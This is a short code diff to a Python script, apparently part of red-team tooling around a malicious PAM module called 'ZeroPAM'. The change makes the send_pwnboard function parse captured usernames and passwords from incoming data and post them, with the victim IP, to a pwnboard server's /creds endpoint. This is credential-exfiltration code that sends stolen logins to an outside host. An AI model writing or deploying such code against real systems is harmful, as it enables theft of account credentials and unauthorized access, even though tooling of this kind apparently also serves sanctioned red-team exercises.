@@ -20,11 +20,14 @@ def server_args(cmd_str):
 
 def send_pwnboard(addr, data, pwnhost):
     ip = data.split("-")[0].strip()
-    host = f"{pwnhost}/generic"
-    data = {"ip": ip, "type": "ZeroPAM"}
+    host = f"{pwnhost}/creds"
+    username = data.split("-")[1].split(":")[1].strip()
+    password = data.split("-")[1].split(":")[2].strip()
+
+    pwn_data = {"ip": ip, "username": username, "password": password}
 
     try:
-        response = requests.post(host, json=data, timeout=3)
+        response = requests.post(host, json=pwn_data, timeout=3)
         return True
     except Exception as E:
         print(E)
